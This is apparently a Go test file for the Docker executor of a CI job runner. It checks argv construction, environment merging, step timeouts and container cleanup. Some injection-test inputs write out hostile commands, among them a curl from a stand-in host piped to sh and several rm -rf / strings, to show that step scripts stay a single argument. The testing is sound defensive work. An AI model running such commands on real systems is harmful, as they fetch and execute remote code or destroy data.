package docker

import (
	"bytes"
	"context"
	"errors"
	"io"
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/docker/docker/api/types/container"

	"github.com/Abyssinia-Labs/latem/internal/executor"
	"github.com/Abyssinia-Labs/latem/pkg/protocol"
)

// INV-3 in one assertion. `run` is the third argv element, whole. If this ever
// becomes a concatenation, a job whose script contains a quote reaches the
// shell as syntax rather than as text, and the invariant the whole design
// rests on is gone.
func TestStepArgv_RunIsASingleElement(t *testing.T) {
	tests := map[string]string{
		"plain":               "make build",
		"quotes":              `echo "hello world"`,
		"single quotes":       `echo 'it'\''s fine'`,
		"semicolons":          "cd src; make; cd ..",
		"newlines":            "set -e\nmake build\nmake test",
		"substitution":        "echo $(git rev-parse HEAD)",
		"backticks":           "echo `date`",
		"leading dash":        "-rf /",
		"empty":               "",
		"trailing backslash":  `echo hi \`,
		"injection lookalike": `x"; curl evil.example | sh; echo "`,
	}

	for name, run := range tests {
		t.Run(name, func(t *testing.T) {
			argv := StepArgv("bash", run)
			want := []string{"bash", "-c", run}
			if !reflect.DeepEqual(argv, want) {
				t.Fatalf("StepArgv = %#v, want %#v", argv, want)
			}
			if len(argv) != 3 {
				t.Errorf("argv has %d elements; run must never be split or joined", len(argv))
			}
		})
	}
}

func TestStepArgv_DefaultShell(t *testing.T) {
	if got := StepArgv("", "make"); got[0] != DefaultShell {
		t.Errorf("empty shell resolved to %q, want %q", got[0], DefaultShell)
	}
	if got := StepArgv("sh", "make"); got[0] != "sh" {
		t.Errorf("shell = %q, want sh", got[0])
	}
}

func TestMergeEnv_Precedence(t *testing.T) {
	run := map[string]string{"A": "run", "B": "run", "C": "run"}
	carried := map[string]string{"B": "carried", "D": "carried"}
	step := map[string]string{"C": "step", "E": "step"}

	got := mergeEnv(run, carried, step)
	want := map[string]string{
		"A": "run",     // only the run environment sets it
		"B": "carried", // $LATEM_ENV merges into the run environment
		"C": "step",    // steps[].env is declared for this step specifically
		"D": "carried",
		"E": "step",
	}
	assertEnv(t, got, want)
}

func TestMergeEnv_DropsUnusableKeys(t *testing.T) {
	got := mergeEnv(map[string]string{
		"GOOD":       "1",
		"":           "no name",
		"HAS=EQUALS": "would corrupt the block",
		"HAS\x00NUL": "would truncate the block",
	})
	assertEnv(t, got, map[string]string{"GOOD": "1"})
}

func TestEnvSlice_IsSorted(t *testing.T) {
	got := envSlice(map[string]string{"C": "3", "A": "1", "B": "2"})
	want := []string{"A=1", "B=2", "C=3"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("envSlice = %q, want %q", got, want)
	}
}

// The F1 contract, asserted against the exec configuration itself: every step
// gets WorkingDir and the whole environment set explicitly, so nothing is
// inherited from whatever the previous step's process did.
func TestExec_EveryStepIsFullyConfigured(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{
		RunID:     "run-1",
		Workspace: t.TempDir(),
		Env:       map[string]string{"CI": "true"},
	})

	steps := []executor.Step{
		{Name: "one", Run: "cd /etc && export LEAKED=yes"},
		{Name: "two", Run: "echo $LEAKED"},
	}
	for _, s := range steps {
		if _, err := env.Exec(context.Background(), s, io.Discard, io.Discard); err != nil {
			t.Fatalf("Exec(%s): %v", s.Name, err)
		}
	}

	if len(f.execOpts) != 2 {
		t.Fatalf("got %d execs, want 2 — one per step", len(f.execOpts))
	}
	for i, opts := range f.execOpts {
		if opts.WorkingDir != WorkspacePath {
			t.Errorf("exec %d WorkingDir = %q, want %q on every step", i, opts.WorkingDir, WorkspacePath)
		}
		if !slices.Contains(opts.Env, "CI=true") {
			t.Errorf("exec %d env %q is missing the run environment", i, opts.Env)
		}
		if !slices.Contains(opts.Env, "LATEM_ENV="+EnvFilePath) {
			t.Errorf("exec %d env %q is missing $LATEM_ENV", i, opts.Env)
		}
		if slices.Contains(opts.Env, "LEAKED=yes") {
			t.Errorf("exec %d inherited an export from the previous step: %q", i, opts.Env)
		}
	}
	if got := f.execOpts[1].Cmd; !reflect.DeepEqual(got, wrappedArgv("bash", executor.ShellLatem, steps[1].Run)) {
		t.Errorf("argv = %#v", got)
	}
}

func TestExec_StepEnvOverridesRunEnv(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{
		RunID:     "run-1",
		Workspace: t.TempDir(),
		Env:       map[string]string{"NODE_ENV": "production"},
	})

	_, err := env.Exec(context.Background(),
		executor.Step{Name: "s", Run: "true", Env: map[string]string{"NODE_ENV": "test"}}, io.Discard, io.Discard)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !slices.Contains(f.execOpts[0].Env, "NODE_ENV=test") {
		t.Errorf("steps[].env did not override the run environment: %q", f.execOpts[0].Env)
	}
	if slices.Contains(f.execOpts[0].Env, "NODE_ENV=production") {
		t.Errorf("both values are present: %q", f.execOpts[0].Env)
	}
}

// A50: every step gets the workspace and the run's temporary directory as the
// container sees them, and a job cannot point either somewhere else.
func TestExec_WorkspaceAndRunnerTemp(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{
		RunID:     "run-1",
		Workspace: t.TempDir(),
		Env:       map[string]string{"RUNNER_TEMP": "/elsewhere"},
	})
	if env.TempDir() != TempPath {
		t.Errorf("TempDir() = %q, want %q", env.TempDir(), TempPath)
	}
	if _, err := env.Exec(context.Background(), executor.Step{Name: "s", Run: "true"}, io.Discard, io.Discard); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	for _, kv := range []string{"GITHUB_WORKSPACE=" + WorkspacePath, "RUNNER_TEMP=" + TempPath} {
		if !slices.Contains(f.execOpts[0].Env, kv) {
			t.Errorf("%s missing from %q", kv, f.execOpts[0].Env)
		}
	}
}

// The between-step channel: what step one writes to $LATEM_ENV, step two
// reads from its environment. This is the only thing that crosses a step
// boundary, because §9 leaves nothing else that can.
func TestExec_LatemEnvCarriesForward(t *testing.T) {
	f := &fakeAPI{envFileData: []byte("BUILD_NUMBER=42\nARTIFACT=app.aab\n")}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	if _, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "true"}, io.Discard, io.Discard); err != nil {
		t.Fatalf("Exec one: %v", err)
	}
	if _, err := env.Exec(context.Background(), executor.Step{Name: "two", Run: "true"}, io.Discard, io.Discard); err != nil {
		t.Fatalf("Exec two: %v", err)
	}

	second := f.execOpts[1].Env
	for _, want := range []string{"BUILD_NUMBER=42", "ARTIFACT=app.aab"} {
		if !slices.Contains(second, want) {
			t.Errorf("step two env %q is missing %q", second, want)
		}
	}
	if slices.Contains(f.execOpts[0].Env, "BUILD_NUMBER=42") {
		t.Error("step one saw a variable it had not written yet")
	}
}

// Truncation is what stops one step's assignments being re-merged after every
// later step, which would make a variable a job unset in step three reappear.
func TestExec_LatemEnvIsTruncatedBetweenSteps(t *testing.T) {
	f := &fakeAPI{envFileData: []byte("A=1\n")}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	before := len(f.copiedTo)
	if _, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "true"}, io.Discard, io.Discard); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if len(f.copiedTo) != before+1 {
		t.Fatalf("got %d copies after the step, want one truncation", len(f.copiedTo)-before)
	}
	last := f.copiedTo[len(f.copiedTo)-1]
	if body, ok := last.entries["latem/env"]; !ok || body != "" {
		t.Errorf("truncating copy wrote %q to %v, want an empty file", body, last.entries)
	}
}

func TestExec_LatemEnvWarningsReachTheStepLog(t *testing.T) {
	f := &fakeAPI{envFileData: []byte("this is not an assignment\nOK=1\n")}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	var log bytes.Buffer
	if _, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "true"}, &log, &log); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(log.String(), "[latem] $LATEM_ENV line 1") {
		t.Errorf("warning did not reach the step log; got %q", log.String())
	}
}

func TestExec_StreamsOutputAndReturnsExitCode(t *testing.T) {
	f := &fakeAPI{
		envFileMissing: true,
		execStdout:     []string{"building\n"},
		execStderr:     []string{"warning: deprecated\n"},
		execExitCodes:  []int{7},
	}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	var log bytes.Buffer
	res, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "make"}, &log, &log)
	// A non-zero exit is a result, not an error: the agent maps it to E_STEP.
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if res.ExitCode != 7 {
		t.Errorf("exit res.ExitCode = %d, want 7", res.ExitCode)
	}
	for _, want := range []string{"building", "warning: deprecated"} {
		if !strings.Contains(log.String(), want) {
			t.Errorf("log %q is missing %q", log.String(), want)
		}
	}
}

// Amendment A9 gave Exec separate stdout and stderr writers. Before it,
// executor.Env.Exec took one io.Writer, which made protocol.LogFrame.Stream
// unfillable: the wire type has the field and the log pipeline distinguishes
// the two, but the executor could not say which was which.
func TestExec_StdoutAndStderrAreReportedSeparately(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, execStdout: []string{"out\n"}, execStderr: []string{"err\n"}}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	var stdout, stderr bytes.Buffer
	if _, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "make"}, &stdout, &stderr); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout.String(), "out") || strings.Contains(stdout.String(), "err") {
		t.Errorf("stdout = %q", stdout.String())
	}
	if !strings.Contains(stderr.String(), "err") || strings.Contains(stderr.String(), "out") {
		t.Errorf("stderr = %q", stderr.String())
	}
}

// Passing one writer twice is legal for a caller that wants them interleaved,
// which is what a human reading a build log usually wants.
func TestExec_SameWriterTwiceInterleaves(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, execStdout: []string{"out\n"}, execStderr: []string{"err\n"}}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	var both bytes.Buffer
	if _, err := env.Exec(context.Background(), executor.Step{Name: "one", Run: "make"}, &both, &both); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(both.String(), "out") || !strings.Contains(both.String(), "err") {
		t.Errorf("combined = %q", both.String())
	}
}

// §9: exceeding steps[].timeout kills the step's process group. Since A45 that
// is what happens here too — the group is signalled from a second exec, as
// root — and the run container is left standing, because since A42 a step
// timeout is a failure like any other and an `if: always()` step after it needs
// somewhere to run.
func TestExec_StepTimeout(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, blockExec: true}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	_, err := env.Exec(context.Background(),
		executor.Step{Name: "hangs", Run: "sleep 900", Timeout: 50 * time.Millisecond}, io.Discard, io.Discard)
	if err == nil {
		t.Fatal("Exec returned no error for a step that never finished")
	}
	if got := CodeOf(err); got != protocol.ErrStepTimeout {
		t.Errorf("error code = %q, want %q (%v)", got, protocol.ErrStepTimeout, err)
	}

	var stop *container.ExecOptions
	for i := range f.execOpts {
		if f.execOpts[i].User == "0" {
			stop = &f.execOpts[i]
		}
	}
	if stop == nil {
		t.Fatal("no stop was issued, so the hung step is still running")
	}
	want := []string{"/bin/sh", "-c", stopScript, StepPidFile, "30"}
	if !reflect.DeepEqual(stop.Cmd, want) {
		t.Errorf("stop argv = %#v, want %#v", stop.Cmd, want)
	}
	if len(f.killed) != 0 {
		t.Errorf("the run container was killed (%v); later steps would have nowhere to run", f.killed)
	}
}

// When the step cannot be stopped in place — a forged pid file, an image with
// no sh — the container is killed after all, and the log says so. A step that
// cannot be stopped must not be left running against the job's clock.
func TestExec_StepTimeoutFallsBackToKillingTheContainer(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, blockExec: true, execExitCodes: []int{3}}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	var log bytes.Buffer
	_, err := env.Exec(context.Background(),
		executor.Step{Name: "hangs", Run: "sleep 900", Timeout: 50 * time.Millisecond}, &log, &log)
	if got := CodeOf(err); got != protocol.ErrStepTimeout {
		t.Errorf("error code = %q (%v)", got, err)
	}
	if len(f.killed) == 0 {
		t.Error("a step that could not be stopped in place must not be left running")
	}
	if !strings.Contains(log.String(), "could not be stopped in place") {
		t.Errorf("the log should say why later steps cannot run: %q", log.String())
	}
}

// The wrapper is a constant and the step is still one element (INV-3): nothing
// of `run` is ever written into the script that records the pid.
func TestWrappedArgv(t *testing.T) {
	run := `echo "$(id)"; rm -rf / # '"`
	got := wrappedArgv("bash", executor.ShellLatem, run)
	want := []string{"/bin/sh", "-c", stepWrapper, StepPidFile, "bash", "-c", run}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("argv = %#v, want %#v", got, want)
	}
	if strings.Contains(stepWrapper, "rm") || strings.Contains(got[2], run) {
		t.Error("the wrapper must never contain any part of the step")
	}
}

// A step compiled from a workflow runs under GitHub's shell inside the same
// wrapper, with `run` still the last element, whole (A50, INV-3).
func TestWrappedArgv_GitHubShell(t *testing.T) {
	run := `false; echo "$(id)"`
	got := wrappedArgv("bash", executor.ShellGitHub, run)
	want := []string{"/bin/sh", "-c", stepWrapper, StepPidFile, "bash", "-e", "-c", run}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("argv = %#v, want %#v", got, want)
	}
}

// Cancellation of the job as a whole is not a step timeout: the agent will
// report E_TIMEOUT or a cancel, and mislabelling it would send an operator
// looking for a step-level budget that was never exceeded.
func TestExec_ParentCancellationIsNotAStepTimeout(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, blockExec: true}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		time.Sleep(20 * time.Millisecond)
		cancel()
	}()
	_, err := env.Exec(ctx, executor.Step{Name: "cancelled", Run: "sleep 900"}, io.Discard, io.Discard)
	if err == nil {
		t.Fatal("Exec returned no error for a cancelled step")
	}
	if got := CodeOf(err); got == protocol.ErrStepTimeout {
		t.Errorf("a cancelled job was reported as %q", got)
	}
}

// Close is called on every path, including after a failure, and the agent has
// no way to know whether an earlier one succeeded.
func TestClose_IsIdempotent(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	for i := 0; i < 3; i++ {
		if err := env.Close(context.Background()); err != nil {
			t.Fatalf("Close %d: %v", i, err)
		}
	}
	if len(f.removed) != 1 {
		t.Errorf("removed the container %d times, want 1", len(f.removed))
	}
}

// "Best effort even when it has already failed once": a Close that could not
// remove the container must try again next time, or a transient daemon hiccup
// leaks a container for good.
func TestClose_RetriesAfterAFailure(t *testing.T) {
	f := &fakeAPI{envFileMissing: true, removeErr: errors.New("daemon busy")}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})

	if err := env.Close(context.Background()); err == nil {
		t.Fatal("first Close hid a removal failure")
	}
	f.removeErr = nil
	if err := env.Close(context.Background()); err != nil {
		t.Fatalf("second Close: %v", err)
	}
	if len(f.removed) != 2 {
		t.Errorf("attempted removal %d times, want 2", len(f.removed))
	}
}

func TestExec_AfterCloseIsRefused(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})
	if err := env.Close(context.Background()); err != nil {
		t.Fatalf("Close: %v", err)
	}

	_, err := env.Exec(context.Background(), executor.Step{Name: "s", Run: "true"}, io.Discard, io.Discard)
	if err == nil {
		t.Fatal("Exec succeeded on a closed environment")
	}
	if got := CodeOf(err); got != protocol.ErrExecutor {
		t.Errorf("error code = %q, want %q", got, protocol.ErrExecutor)
	}
}

// prepared runs Prepare against the fake and returns the Env.
func prepared(t *testing.T, f *fakeAPI, spec executor.Spec) executor.Env {
	t.Helper()
	e, _ := newExecutor(t, f, nil)
	if spec.Workspace == "" {
		spec.Workspace = t.TempDir()
	}
	// Prepare creates $LATEM_ENV, which the fake models as a truncation.
	// Restore whatever the test programmed and forget the setup call, so the
	// assertions below are about what happens between steps.
	programmed, missing := f.envFileData, f.envFileMissing
	env, err := e.Prepare(context.Background(), spec)
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	t.Cleanup(func() { _ = env.Close(context.Background()) })
	f.mu.Lock()
	f.copiedTo = nil
	f.envFileData, f.envFileMissing = programmed, missing
	f.mu.Unlock()
	return env
}

func TestContainerID_IsExposedForReconciliation(t *testing.T) {
	f := &fakeAPI{envFileMissing: true}
	env := prepared(t, f, executor.Spec{RunID: "run-1", Workspace: t.TempDir()})
	ided, ok := env.(interface{ ContainerID() string })
	if !ok {
		t.Fatal("the Env does not expose its container id")
	}
	if ided.ContainerID() == "" {
		t.Error("ContainerID is empty")
	}
}
